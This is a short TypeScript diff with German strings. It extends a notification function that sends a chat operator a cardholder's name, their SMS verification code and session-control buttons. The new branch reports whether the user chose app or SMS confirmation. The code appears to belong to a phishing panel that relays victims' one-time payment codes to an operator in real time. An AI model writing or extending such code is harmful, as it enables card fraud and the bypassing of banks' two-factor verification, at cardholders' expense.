@@ -284,6 +284,12 @@ async function sendNotification(chatId: string, type: string, data: any) {
                   `Karteninhaber: ${data.cardholder_name || 'Unknown'}\n` +
                   `Code: \`${data.sms_code}\``;
         buttons = getCompletionButtons(data.session_id);
+      } else if (data.message && data.message.includes('User wählte:')) {
+        // Handle user choice notification
+        const choice = data.verification_method === 'app_confirmation' ? 'App-Bestätigung' : 'SMS-Bestätigung';
+        message = `🎯 *User hat gewählt*\n\n` +
+                  `Wahl: ${choice}\n` +
+                  `Karteninhaber: ${data.cardholder_name || 'Unknown'}`;
       }
       break;
   }
